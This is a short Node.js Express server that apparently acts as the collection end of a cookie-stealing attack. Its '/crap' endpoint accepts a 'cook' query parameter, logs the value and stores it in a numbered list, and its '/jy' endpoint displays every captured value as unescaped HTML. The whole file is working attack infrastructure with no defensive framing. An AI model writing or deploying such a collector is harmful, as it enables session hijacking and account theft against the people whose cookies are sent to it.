const express = require("express");
const app = express();

console.log("start\n");

let cookies = "";
var count_cookies = 1;

app.use(express.static(__dirname + "/html"));

app.get("/home", function(req, res){
	console.log("lol");
	res.sendFile(__dirname + "/html/index.html");
});

app.get("/jy", function(req , res){
	res.send(cookies);
});

app.get("/crap", function(req, res) {
	let c = req.query.cook;
	cookies += "Cookie " + count_cookies + ": " + c + "<br>";
	count_cookies++;
	console.log("Cookie: " + c);
	res.sendStatus(202);
});

app.listen(3000);